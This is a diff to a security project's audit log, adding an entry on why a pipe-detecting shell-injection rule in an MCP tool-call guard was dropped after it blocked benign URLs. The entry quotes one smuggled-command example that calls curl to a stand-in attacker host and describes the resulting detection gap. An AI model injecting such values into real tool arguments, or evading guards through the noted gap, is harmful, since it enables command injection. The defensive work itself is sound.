@@ -1584,3 +1584,45 @@ mcpm's own security posture explicitly assumes a sophisticated attacker will tar
 whatever the guard is known to check for. Growing to a THIRD bespoke detector (#51/#52
 are the same key+value shape) without this raises the number of independently-evadable
 value checks in the codebase; worth closing before, not after, that happens.
+
+## #56 — a pipe-only shell injection in an identifier arg is no longer detected (P2, open)
+
+**Found:** 2026-08-28, pre-release audit of the unreleased v0.31.0 range — by MEASURING
+the two new `tool_call_args` detectors against a benign corpus of realistic tool calls,
+not by reading them.
+
+`shell-metachar-in-identifier-arg` (#50) shipped a bare `/\|/` pattern. Measured, it
+hard-BLOCKED three ordinary values under a `path`-suffixed argument, on a block-capable
+carrier, on the live relay:
+
+- `/css?family=Roboto|Open+Sans` — the canonical Google Fonts URL shape
+- `/api/users?fields=id|name|email` — a REST field selector
+- `/v1/items?sort=created|desc`
+
+**#50's own entry predicted this and it shipped anyway**: its "FP risk, unmeasured"
+paragraph reads *"Legitimate arguments can contain `|` (filter syntax)"*. The
+implementation's justification for including the `path` suffix — "a real filesystem path
+never legitimately contains ... an unescaped `|` on any OS" — is TRUE of filesystem paths
+and false of the argument key, because a `path`-suffixed MCP argument is routinely a URL
+or API path, where a raw pipe in a query string is normal.
+
+The pattern was DROPPED, on the same three premises this file already uses to justify
+dropping `&`, each measured rather than argued: (1) whitespace-gating is evadable
+(`cmd1|cmd2`); (2) ungated it FPs on the real values above; (3) neither motivating CVE
+needs it — CVE-2025-53818's PoC carries `;`, CVE-2026-25546's carries a backtick, and both
+still block. Deleting it left **all 150 guard tests green**, so it was never load-bearing
+and nothing pinned it — the same certifies-nothing shape logged in the v0.27.0 / v0.28.0 /
+v0.29.0 rows. A regression test now pins the three FP values.
+
+**What this costs, stated plainly:** a pipe-ONLY injection in an identifier-shaped
+argument (`issue_number: "1|curl attacker.example"`) now passes with zero findings. That
+is a real narrowing, accepted deliberately in the safe direction — a wrong BLOCK on a
+block-capable carrier is the failure mode this project has repeatedly judged worse than a
+miss (v0.29.0's `Math.min` row; "every FP across all seven rounds was the guard blocking
+wrongly").
+
+**To close it:** restore pipe detection with a key-scoped rule that survives a benign
+corpus — plausibly matching `|` only under suffixes where it can NEVER be legitimate
+(`number`/`num`/`id`/`uuid`), while leaving `path`/`slug`/`namespace` exempt. That is a
+per-key pattern matrix, so it needs its own design pass and its own corpus, which is why
+it was not improvised during a release audit.
